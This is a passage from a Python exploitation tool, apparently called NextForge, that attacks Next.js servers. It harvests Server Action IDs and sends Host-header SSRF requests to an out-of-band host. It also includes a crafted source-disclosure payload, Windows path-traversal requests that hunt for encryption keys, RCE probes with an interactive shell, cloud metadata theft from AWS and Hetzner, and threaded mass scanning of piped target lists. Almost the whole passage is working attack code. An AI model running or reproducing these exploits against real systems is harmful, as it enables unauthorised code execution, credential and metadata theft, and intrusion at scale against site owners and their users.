        return r.status_code, r.text or "", dict(r.headers)
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as resp:
            return resp.status, resp.read(65536).decode(errors="replace"), dict(resp.headers)
    except Exception as e:
        return 0, str(e), {}


def harvest_action_ids(target, timeout=8):
    """Pull Server Action IDs from HTML + first JS chunks (CVE-2026-64643 recon)."""
    _, body, _ = _http_get(target, timeout=timeout)
    chunks = CHUNK_RE.findall(body or "")[:10]
    blob = body or ""
    for ch in chunks:
        _, b2, _ = _http_get(urljoin(target, ch), timeout=timeout)
        if b2:
            blob += "\n" + b2
    ids = set()
    ids.update(m.lower() for m in ACTION_ID_RE.findall(blob) if len(m) >= 40)
    ids.update(re.findall(r'"id"\s*:\s*"([0-9a-f]{32,})"', blob, re.I))
    ids.update(re.findall(r'next-action["\s:=]+([0-9a-f]{32,})', blob, re.I))
    return sorted(ids), chunks, blob


def probe_action_ids(target, timeout=8):
    ids, chunks, _ = harvest_action_ids(target, timeout)
    return bool(ids), {
        "cve": "CVE-2026-64643",
        "count": len(ids),
        "sample": ids[:12],
        "chunks": chunks[:6],
        "all_ids": ids[:30],
    }


def _action_post(target, action_id, extra_headers, timeout=8, data="{}"):
    hdrs = {
        **BASE_HEADERS,
        "Next-Action": action_id,
        "RSC": "1",
        "Accept": "text/x-component",
        "Content-Type": "application/json",
    }
    hdrs.update(extra_headers or {})
    r = requests.post(
        target.rstrip("/") + "/",
        headers=hdrs,
        data=data,
        verify=False,
        timeout=timeout,
        allow_redirects=False,
    )
    return r


def exploit_host_action_ssrf(target, oast, action_ids, timeout=8):
    """
    CVE-2026-64649 / older Host-header Server Action SSRF.
    Live proof: Host or X-Forwarded-Host is the OAST host AND Next-Action is a real id.
    Confirm in Collaborator (HTTP from the Next.js box), not just 200 OK.
    """
    if not HAS_REQUESTS:
        return False, {}
    host = urlparse(target).hostname or "localhost"
    decoy = (oast or "").replace("https://", "").replace("http://", "").split("/")[0]
    if not decoy:
        return False, {"need_oast": True, "cve": "CVE-2026-64649"}
    ids = (action_ids or [])[:6] or ["x"]
    curls = []
    best = None
    for aid in ids:
        variants = [
            {"Host": decoy, "X-Forwarded-Host": decoy},
            {"X-Forwarded-Host": decoy, "X-Forwarded-Proto": "https"},
            {"Host": host, "X-Forwarded-Host": decoy, "Forwarded": f"host={decoy}"},
        ]
        for vh in variants:
            try:
                r = _action_post(target, aid, vh, timeout)
            except Exception as e:
                continue
            loc = r.headers.get("Location") or r.headers.get("x-action-redirect") or ""
            joined = loc + "\n" + (r.text or "") + "\n" + str(dict(r.headers))
            curl = (
                f'curl -sk -D - -X POST "{target}/" '
                f'-H "Next-Action: {aid}" -H "RSC: 1" '
                + " ".join(f'-H "{k}: {v}"' for k, v in vh.items())
                + ' -d "{}"'
            )
            curls.append(curl)
            if decoy in joined or r.headers.get("x-action-redirect"):
                best = {
                    "cve": "CVE-2026-64649",
                    "confirmed_in_response": decoy in joined,
                    "action_id": aid,
                    "status": r.status_code,
                    "location": loc[:240],
                    "headers": {k: v for k, v in r.headers.items() if k.lower().startswith(("x-action", "location"))},
                    "decoy": decoy,
                    "curls": [curl],
                    "note": "Check OAST/Collaborator for outbound HTTP from the Next.js host. That is the bounty proof.",
                }
                if decoy in joined:
                    return True, best
    if best:
        return True, best
    return False, {"cve": "CVE-2026-64649", "decoy": decoy, "curls": curls[:3], "tried_ids": ids}


def exploit_source_disclosure(target, action_ids, timeout=8):
    """CVE-2025-55183 — stringify a $F server ref; look for function body / secrets."""
    if not HAS_REQUESTS or not action_ids:
        return False, {}
    leaks = []
    for aid in action_ids[:8]:
        # Flight-style argument that often gets coerced to string on error paths
        body = (
            '----NextForgeSrc\r\n'
            'Content-Disposition: form-data; name="0"\r\n\r\n'
            '{"then":"$1:__proto__:then"}\r\n'
            '----NextForgeSrc\r\n'
            'Content-Disposition: form-data; name="1"\r\n\r\n'
            '"$F1"\r\n'
            '----NextForgeSrc--\r\n'
        )
        hdrs = {
            **BASE_HEADERS,
            "Next-Action": aid,
            "Accept": "text/x-component",
            "Content-Type": "multipart/form-data; boundary=----NextForgeSrc",
        }
        try:
            r = requests.post(target.rstrip("/") + "/", headers=hdrs, data=body,
                              verify=False, timeout=timeout, allow_redirects=False)
        except Exception:
            continue
        text = r.text or ""
        if any(m in text for m in SRC_LEAK_MARKERS) and "[omitted code]" not in text:
            leaks.append({"action_id": aid, "status": r.status_code, "preview": text[:800]})
    return bool(leaks), {
        "cve": "CVE-2025-55183",
        "leaks": leaks,
        "curls": [
            f'curl -sk -X POST "{target}/" -H "Next-Action: {action_ids[0]}" '
            f'-H "Content-Type: multipart/form-data; boundary=----NextForgeSrc" --data-binary @- <<\'EOF\'\n{body}EOF'
        ] if action_ids else [],
    }


def exploit_win_cache_traversal(target, timeout=8):
    """
    CVE-2026-75604 stage-1: read outside incremental-cache via encoded backslash.
    Stage-2 RCE needs the leaked encryption key + a bound Server Action on Windows.
    """
    extra = [
        "/_next/data/%5c..%5c..%5c..%5cserver%5cserver-reference-manifest.js",
        "/_next/data/%5c..%5c..%5c..%5cserver%5capp-paths-manifest.json",
        "/_next/static/%5c..%5c..%5c..%5cserver%5cserver-reference-manifest.js",
        "/%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "/%5c%5c..%5c..%5cwindows%5cwin.ini",
    ]
    findings = []
    curls = []
    for path in WIN_TRAVERSAL_PATHS + extra:
        url = urljoin(target, path)
        code, body, _ = _http_get(url, timeout=timeout)
        curls.append(f'curl -sk "{url}"')
        low = (body or "").lower()
        interesting = any(
            x in low
            for x in (
                "server-reference-manifest", "encryptionkey", "encryption_key",
                "encryption key", "[fonts]", "for 16-bit app support",
                "next-server-actions-encryption-key",
            )
        )
        if interesting or (code == 200 and "manifest" in low and len(body) > 40):
            findings.append({"path": path, "status": code, "preview": body[:500]})
    return bool(findings), {
        "cve": "CVE-2026-75604",
        "hits": findings,
        "curls": [f'curl -sk "{urljoin(target, h["path"])}"' for h in findings] or curls[:3],
        "note": "Key leak is the reportable proof. Full Windows RCE is a second stage after the key.",
    }


# ── Smart Scan ───────────────────────────────────────────────
def scan_one(target, args):
    result = {"target": target, "is_nextjs": False, "profile": {},
              "rce": False, "ssrf": False, "middleware_bypass": False,
              "cloud": None, "findings": {}, "priority": "none"}
    host, port, use_ssl, base = parse_target(target)
    profile = detect_nextjs(base, args.timeout)
    result["profile"] = profile
    result["is_nextjs"] = profile["is_nextjs"]
    if not profile["is_nextjs"] and not args.force:
        return result

    if not args.quiet:
        step(f"Profiling {base}")
        dim(f"Next.js {profile['version_str']} | {profile['router']} | MW={profile['middleware']} | Turbo={profile['turbopack']}")
        if profile["potential"]:
            dim(f"Potential: {', '.join(profile['potential'])}")

    want_full = bool(getattr(args, "full", False) or args.auto)
    full_waf = want_full

    # RCE
    rce_ok, rce_out, rce_mode = False, None, None
    if args.mode in ("auto", "all", "rce") or args.auto or want_full:
        if not args.quiet:
            step("Probing RCE" + (" (full WAF matrix)" if full_waf else ""))
        rce_ok, rce_out, rce_mode = exploit_rce(base, "id", full_waf, args.timeout)

    # SSRF
    ssrf_ok, ssrf_url, ssrf_body = False, None, None
    if args.mode in ("auto", "all", "ssrf") or args.auto or want_full:
        if not args.quiet:
            step("Probing SSRF (CVE-2026-44578)")
        ssrf_ok, ssrf_url, ssrf_body = probe_ssrf(host, port, use_ssl, args.timeout)

    # Middleware — --full runs every technique and keeps every hit
    mw_ok, mw_cve, mw_detail, mw_meta = False, None, None, {}
    if args.mode in ("auto", "all", "middleware") or args.auto or want_full or profile.get("middleware"):
        if not args.quiet:
            step("Probing middleware / auth bypass matrix" + (" (FULL)" if want_full else ""))
        mw_ok, mw_cve, mw_detail, mw_meta = probe_middleware(
            base, args.timeout, collect_all=want_full
        )
        extra_hits = (mw_meta or {}).get("all") or []
        if extra_hits and not args.quiet:
            info(f"bypass hits: {len(extra_hits)}")
            for h in extra_hits:
                dim(f"{h.get('cve')} | {h.get('technique')} | {h.get('detail')}")

    extra_ok = args.mode in ("auto", "all", "ssrf", "middleware") or args.auto or want_full
    if extra_ok:
        if not args.quiet:
            step("Probing 2026-07/08 extras (64643 / 64649 / 75604)")
        aid_ok, aid_meta = probe_action_ids(base, args.timeout)
        action_ids = aid_meta.get("all_ids") or aid_meta.get("sample") or []
        if aid_ok:
            result["findings"]["action_ids"] = aid_meta
            info(f"CVE-2026-64643 action IDs: {aid_meta['count']}  sample={aid_meta['sample'][:3]}")
            print_curl_box("Harvested Next-Action IDs", [f"# {i}" for i in action_ids[:8]])

        host_ok, host_meta = exploit_host_action_ssrf(
            base, getattr(args, "oast", None), action_ids, args.timeout
        )
        if host_meta.get("need_oast") and not args.quiet:
            warn("CVE-2026-64649 exploit ready but --oast missing. Re-run with --oast xyz.oastify.com")
        elif host_ok:
            result["findings"]["action_ssrf"] = host_meta
            result["ssrf"] = True
            hit("SERVER ACTION HOST SSRF EXPLOITED — CVE-2026-64649")
            print_curl_box("PoC / Curl (confirm in OAST)", host_meta.get("curls") or [])
            print_report_snippet(
                "CVE-2026-64649", "High", base,
                f"Server Action Host-header SSRF action={host_meta.get('action_id')} decoy={host_meta.get('decoy')}",
                host_meta.get("curls") or [],
                "Unauthenticated SSRF / request forwarding to attacker host via Server Action.",
            )

        src_ok, src_meta = exploit_source_disclosure(base, action_ids, args.timeout)
        if src_ok:
            result["findings"]["source_leak"] = src_meta
            hit("SERVER FUNCTION SOURCE LEAK — CVE-2025-55183")
            for leak in src_meta.get("leaks") or []:
                dim(leak.get("preview", "")[:200])
            print_curl_box("PoC / Curl", src_meta.get("curls") or [])

        win_ok, win_meta = exploit_win_cache_traversal(base, args.timeout)
        if win_ok:
            result["findings"]["win_traversal"] = win_meta
            hit("WINDOWS CACHE TRAVERSAL LEAK — CVE-2026-75604")
            for h in win_meta.get("hits") or []:
                dim(f"{h['status']} {h['path']}")
            print_curl_box("PoC / Curl", win_meta.get("curls") or [])
            print_report_snippet(
                "CVE-2026-75604", "Critical (Windows)", base,
                "Encoded backslash escaped incremental-cache and returned private build/manifest data.",
                win_meta.get("curls") or [],
                "Unauthenticated read of server-reference-manifest / encryption material on Windows-hosted Next.js.",
            )

    result["rce"] = rce_ok
    result["ssrf"] = ssrf_ok or bool(result.get("ssrf"))
    result["middleware_bypass"] = mw_ok

    if rce_ok:
        result["priority"] = "rce"
        result["findings"]["rce"] = {"mode": rce_mode, "output": rce_out}
        hit(f"RCE CONFIRMED — {rce_mode}")
        safe_print(f"  {G}{rce_out}{RESET}")
        # Evidence + curl + report
        ev = save_evidence(base, "CVE-2025-55182", f"rce_{rce_mode}", rce_out or "")
        info(f"Evidence saved: {ev}")
        rce_curls = [
            f'# RCE confirmed via WAF mode: {rce_mode}',
            f'# Use NextForge interactive shell for further commands:',
            f'python3 nextforge.py -t {base} --mode rce --auto',
        ]
        print_curl_box("PoC / Curl", rce_curls)
        print_report_snippet(
            "CVE-2025-55182 / CVE-2025-66478", "Critical", base,
            f"RCE via RSC Flight deserialization (mode={rce_mode})",
            rce_curls,
            "Unauthenticated remote code execution on the Next.js server process.",
            ev,
        )
        if args.auto or args.shell:
            rce_shell(base, full_waf, args.timeout)  # --full does not auto-drop into shell

    elif ssrf_ok:
        result["priority"] = "ssrf"
        hit(f"SSRF CONFIRMED — {ssrf_url}")
        if ssrf_body:
            safe_print(f"  {DIM}{ssrf_body[:200]}{RESET}")
        ev = save_evidence(base, "CVE-2026-44578", "ssrf", f"URL: {ssrf_url}\n\n{ssrf_body or ''}")
        info(f"Evidence saved: {ev}")
        scheme = "https" if use_ssl else "http"
        ssrf_curls = [
            f'curl -sk --http1.1 --request-target "{ssrf_url}" '
            f'-H "Host: {host}" -H "Connection: Upgrade" -H "Upgrade: websocket" '
            f'-H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: {WS_KEY}" '
            f'{scheme}://{host}:{port}/',
        ]
        print_curl_box("PoC / Curl", ssrf_curls)
        print_report_snippet(
            "CVE-2026-44578", "High", base,
            f"WebSocket upgrade SSRF → {ssrf_url}",
            ssrf_curls,
            "Unauthenticated SSRF to internal services / cloud metadata (port 80).",
            ev,
        )
        clouds = detect_cloud_via_ssrf(host, port, use_ssl, args.timeout)
        result["cloud"] = list(clouds.keys()) if clouds else None
        if clouds:
            info(f"Cloud: {', '.join(c.upper() for c in clouds)}")
            if "hetzner" in clouds:
                meta = exploit_hetzner(host, port, use_ssl, args.timeout)
                result["findings"]["hetzner"] = meta
                if meta:
                    hdr("Hetzner Metadata")
                    for k, v in meta.items():
                        safe_print(f"  {Y}{k:<20}{RESET}: {G}{v}{RESET}")
                    save_evidence(base, "CVE-2026-44578", "hetzner_meta", json.dumps(meta, indent=2))
            elif "aws" in clouds:
                meta = exploit_aws_basic(host, port, use_ssl, args.timeout)
                result["findings"]["aws"] = meta
                if meta:
                    hdr("AWS Metadata")
                    for k, v in meta.items():
                        safe_print(f"  {Y}{k:<20}{RESET}: {G}{str(v)[:90]}{RESET}")
                    save_evidence(base, "CVE-2026-44578", "aws_meta", json.dumps(meta, indent=2, default=str))
        if args.auto:
            step("Deep internal probe...")
            hits = deep_internal_probe(host, port, use_ssl, args.timeout)
            for h in hits:
                safe_print(f"  {G}[{h['code']}]{RESET} {h['desc']:<18} {h['url']}")
            if args.auto or args.shell:
                ssrf_shell(host, port, use_ssl, args.timeout)

    elif mw_ok:
        result["priority"] = "middleware"
        result["findings"]["middleware"] = {"cve": mw_cve, "detail": mw_detail, **mw_meta}
        hit(f"MIDDLEWARE BYPASS — {mw_cve}")
        safe_print(f"  {Y}{mw_detail}{RESET}")
        body = mw_meta.get("body", "")
        ev = save_evidence(base, mw_cve or "middleware", mw_meta.get("path", "bypass"), body)
        info(f"Evidence saved: {ev}")
        curls = mw_meta.get("curls") or [f'curl -sk "{urljoin(base, mw_meta.get("path", "/"))}"']
        print_curl_box("PoC / Curl", curls)
        severity = "High"
        impact = "Authentication/authorization middleware bypass — protected routes accessible without auth."
        print_report_snippet(mw_cve or "Middleware Bypass", severity, base, mw_detail, curls, impact, ev)
    else:
        if not args.quiet and profile["is_nextjs"]:
            dim("Next.js detected — no high-impact vector confirmed")
    return result

# ── Mass / Pipeline ──────────────────────────────────────────
_results = []
_lock = threading.Lock()
_exit_code = 0

def worker(q, args):
    global _exit_code
    while True:
        try:
            t = q.get(timeout=1)
        except Empty:
            break
        try:
            a = argparse.Namespace(**vars(args))
            a.shell = False
            a.auto = False
            a.mode = "auto"
            r = scan_one(t, a)
            with _lock:
                _results.append(r)
                if r.get("rce") or r.get("ssrf") or r.get("middleware_bypass"):
                    _exit_code = max(_exit_code, 2)
                elif r.get("is_nextjs"):
                    _exit_code = max(_exit_code, 1)
            tags = []
            if r.get("rce"): tags.append(f"{R}RCE{RESET}")
            if r.get("ssrf"): tags.append(f"{R}SSRF{RESET}")
            if r.get("middleware_bypass"): tags.append(f"{Y}MW{RESET}")
            if r.get("cloud"): tags.append(f"{G}{'+'.join(r['cloud']).upper()}{RESET}")
            if tags:
                safe_print(f"{G}[HIT]{RESET} {r['target']}  {' | '.join(tags)}")
            elif r.get("is_nextjs") and not args.quiet:
                safe_print(f"{DIM}[next]{RESET} {r['target']}")
        except Exception as e:
            if not args.quiet:
                err(f"{t}: {e}")
        finally:
            q.task_done()

def print_summary(results):
    nextjs = [r for r in results if r.get("is_nextjs")]
    hits = [r for r in results if r.get("rce") or r.get("ssrf") or r.get("middleware_bypass")]
    safe_print(f"\n{VIOLET}{'═'*60}{RESET}\n  {BOLD}NextForge Summary{RESET}\n{VIOLET}{'═'*60}{RESET}")
    safe_print(f"  Scanned      : {len(results)}")
    safe_print(f"  Next.js      : {len(nextjs)}")
    safe_print(f"  {R}High-impact  : {len(hits)}{RESET}")
    if hits:
        safe_print(f"\n{R}[CONFIRMED]{RESET}")
        for r in hits:
            tags = []
            if r.get("rce"): tags.append("RCE")
            if r.get("ssrf"): tags.append("SSRF")
            if r.get("middleware_bypass"): tags.append("MW")
            if r.get("cloud"): tags.append("+".join(r["cloud"]).upper())
            safe_print(f"  {W}{r['target']}{RESET}  [{', '.join(tags)}]")

def save_results(path, results):
    with open(path, "w") as f:
        if path.endswith(".json"):
            json.dump(results, f, indent=2, default=str)
        else:
            for r in results:
                f.write(json.dumps(r, default=str) + "\n")
    info(f"Saved → {path}")

# ── CLI ──────────────────────────────────────────────────────
def main():
    global _exit_code
    p = argparse.ArgumentParser(prog="nextforge",
        description="NextForge v2.0 — Unified Next.js RCE + SSRF + Middleware",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 nextforge.py -t https://target.com --auto
  python3 nextforge.py -t https://target.com --auto --shell
  python3 nextforge.py -t https://target.com --mode ssrf
  cat hosts.txt | python3 nextforge.py --pipe --auto -o hits.jsonl
  subfinder -d t.com | httpx -silent | python3 nextforge.py --pipe --auto
""")
    p.add_argument("-t", "-u", "--target", dest="target",
                   help="Target URL (-t or -u)")
    p.add_argument("--pipe", action="store_true")
    p.add_argument("-f", "--file")
    p.add_argument("--threads", type=int, default=12)
    p.add_argument("--timeout", type=int, default=8)
    p.add_argument("--mode", choices=["auto", "all", "ssrf", "rce", "middleware"], default="auto")
    p.add_argument("--auto", action="store_true",
                   help="FULL POWER: WAF matrix + all probes + auto shell + deep internal")
    p.add_argument("--full", action="store_true",
                   help="Every exploit + every middleware/header/i18n/RSC bypass. No interactive shell.")
    p.add_argument("--shell", action="store_true")
    p.add_argument("--force", action="store_true")
    p.add_argument("-o", "--output")
    p.add_argument("--oast", help="OAST host for CVE-2026-64649 (e.g. xyz.oastify.com)")
    p.add_argument("-q", "--quiet", action="store_true")
    p.add_argument("--no-banner", action="store_true")
    args = p.parse_args()

    if args.auto:
        args.mode = "auto"
        args.shell = True
    if args.full:
        args.mode = "all"
        args.force = True

    if not args.no_banner and not args.quiet:
        banner()
    if not HAS_REQUESTS:
        warn("requests not installed — RCE & Middleware limited (SSRF still works)")

    targets = []
    if args.target:
        targets.append(args.target)
    if args.pipe:
        for line in sys.stdin:
            line = line.strip()
            if not line or line.startswith("#"): continue
            m = re.search(r"(https?://[^\s]+)", line)
            targets.append(m.group(1) if m else line)
    if args.file:
        try:
            with open(args.file) as f:
                targets += [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            err(f"File not found: {args.file}"); sys.exit(1)
    if not targets:
        err("No targets. Use -t / --pipe / -f"); sys.exit(1)

    targets = list(dict.fromkeys(t if t.startswith("http") else "https://" + t for t in targets))

    def _sig(s, f):
        warn("Interrupted")
        print_summary(_results)
        if args.output: save_results(args.output, _results)
        sys.exit(_exit_code)
    signal.signal(signal.SIGINT, _sig)

    if len(targets) == 1 and (args.auto or args.shell or True):
        r = scan_one(targets[0], args)
        _results.append(r)
        if args.output: save_results(args.output, _results)
        sys.exit(2 if (r.get("rce") or r.get("ssrf") or r.get("middleware_bypass")) else 0)

    if not args.quiet:
        step(f"Scanning {len(targets)} targets | threads={args.threads}")
    q = Queue()
    for t in targets: q.put(t)
    threads = [threading.Thread(target=worker, args=(q, args), daemon=True)
               for _ in range(min(args.threads, len(targets)))]
    for t in threads: t.start()
    try:
        q.join()
    except KeyboardInterrupt:
        _sig(None, None)
    if not args.quiet:
        print_summary(_results)
    if args.output:
        save_results(args.output, _results)
    sys.exit(_exit_code)

if __name__ == "__main__":
    main()
